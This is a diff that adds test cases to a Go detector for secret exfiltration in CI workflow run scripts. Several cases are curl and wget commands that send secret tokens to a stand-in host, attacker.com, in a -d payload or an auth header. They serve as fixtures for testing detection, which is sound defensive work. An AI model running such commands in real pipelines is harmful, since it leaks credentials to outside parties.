@@ -360,6 +360,81 @@ func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
 			wantErrors:  1,
 			description: "Should detect secret env var used in -H header to untrusted destination",
 		},
+		{
+			name: "curl with content-type header before webhook URL (not exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"WEBHOOK_URL": {
+					Name: &ast.String{Value: "WEBHOOK_URL"},
+					Value: &ast.String{
+						Value: "${{ secrets.WEBHOOK_URL }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `curl -H "Content-Type: application/json" "$WEBHOOK_URL"`,
+			wantErrors:  0,
+			description: "Should NOT detect webhook URL after -H content-type header (header is metadata, not payload)",
+		},
+		{
+			name: "curl with header and data payload flag (exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"SECRET_TOKEN": {
+					Name: &ast.String{Value: "SECRET_TOKEN"},
+					Value: &ast.String{
+						Value: "${{ secrets.SECRET_TOKEN }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `curl -H "Content-Type: application/json" -d "$SECRET_TOKEN" https://attacker.com`,
+			wantErrors:  1,
+			description: "Should detect secret env var used after -d payload flag even with preceding -H",
+		},
+		{
+			name: "curl --header with secret in value (exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"API_TOKEN": {
+					Name: &ast.String{Value: "API_TOKEN"},
+					Value: &ast.String{
+						Value: "${{ secrets.API_TOKEN }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `curl --header "X-API-Key: $API_TOKEN" https://attacker.com`,
+			wantErrors:  1,
+			description: "Should detect secret env var inside --header value",
+		},
+		{
+			name: "wget --header with secret in value (exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"AUTH_KEY": {
+					Name: &ast.String{Value: "AUTH_KEY"},
+					Value: &ast.String{
+						Value: "${{ secrets.AUTH_KEY }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `wget --header "Authorization: $AUTH_KEY" https://attacker.com/data`,
+			wantErrors:  1,
+			description: "Should detect secret env var inside wget --header value",
+		},
+		{
+			name: "curl simple webhook URL without any flags (not exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"NOTIFY_URL": {
+					Name: &ast.String{Value: "NOTIFY_URL"},
+					Value: &ast.String{
+						Value: "${{ secrets.NOTIFY_URL }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `curl "$NOTIFY_URL"`,
+			wantErrors:  0,
+			description: "Should NOT detect simple curl with only webhook URL",
+		},
 	}
 
 	for _, tt := range tests {
